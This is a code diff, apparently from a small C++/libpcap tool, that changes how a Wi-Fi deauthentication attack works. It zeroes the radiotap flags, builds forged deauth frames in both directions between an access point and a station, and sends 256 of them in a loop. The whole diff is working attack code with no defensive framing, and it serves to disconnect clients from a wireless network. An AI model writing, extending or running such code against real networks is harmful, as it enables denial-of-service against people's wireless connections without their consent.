@@ -45,8 +45,8 @@ deauth_packet* getDeauthPacket(Mac apMac,  Mac stMac){
     dpkt->rtap.header_revision = 0x0;
     dpkt->rtap.header_pad = 0x0;
     dpkt->rtap.header_length = 0x000c;
-    dpkt->rtap.present_flags[0] = 0x00080004;
-    dpkt->rtap.present_flags[1] = 0x00180002;
+    dpkt->rtap.present_flags[0] = 0x00000000;
+    dpkt->rtap.present_flags[1] = 0x00000000;
 
 
     dpkt->beacon_frame.frame_control_field.init(0xc000);
@@ -92,17 +92,19 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-
-    deauth_packet *packet = getDeauthPacket(Mac(argv[2]), stationMac);
-
-
+    deauth_packet *packet[2];
+    packet[0] = getDeauthPacket(Mac(argv[2]), stationMac);
+    if(argc ==3)
+        packet[1] = getDeauthPacket(Mac(argv[2]), stationMac);
+    else
+        packet[1] = getDeauthPacket(stationMac, Mac(argv[2]));
 
     int res;
 
 
     for (int i =0; i<256; i++){
         usleep(100);
-        res = pcap_sendpacket(handle, reinterpret_cast<const u_int8_t*>(packet), sizeof(deauth_packet));
+        res = pcap_sendpacket(handle, reinterpret_cast<const u_int8_t*>(packet[i%2]), sizeof(deauth_packet));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
